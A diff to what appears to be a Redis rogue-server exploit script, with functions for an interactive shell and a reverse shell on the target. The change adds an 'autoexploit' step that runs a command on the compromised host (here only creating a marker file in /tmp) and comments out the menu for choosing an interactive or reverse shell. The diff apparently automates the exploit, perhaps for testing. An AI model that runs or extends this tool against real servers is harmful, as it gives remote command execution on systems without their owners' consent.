@@ -159,6 +159,11 @@ def reverse(remote):
     print("[*] Check at {}:{}".format(addr, port))
 
 
+def autoexploit(remote):
+    print("\033[92m[+]\033[0m AutoExploitation...")
+    remote.shell_cmd("touch /tmp/test42")
+    print('DONE!')
+
 def interact(remote):
     print("\033[92m[+]\033[0m Interactive shell open , use \"exit\" to exit...")
     try:
@@ -225,14 +230,16 @@ def runserver(rhost, rport, lhost, lport):
         print("[*] Closing rogue server...\n")
         rogue.close()
         # Operations here
-        choice = input("\033[92m[+]\033[0m What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: ")
-        if choice.startswith("i"):
-            interact(remote)
-        elif choice.startswith("r"):
-            reverse(remote)
-        elif choice.startswith("e"):
-            pass
+        
+        #choice = input("\033[92m[+]\033[0m What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: ")
+        #if choice.startswith("i"):
+        #    interact(remote)
+        #elif choice.startswith("r"):
+        #    reverse(remote)
+        #elif choice.startswith("e"):
+        #    pass
 
+        autoexploit(remote)
         cleanup(remote, expfile)
 
         remote.close()
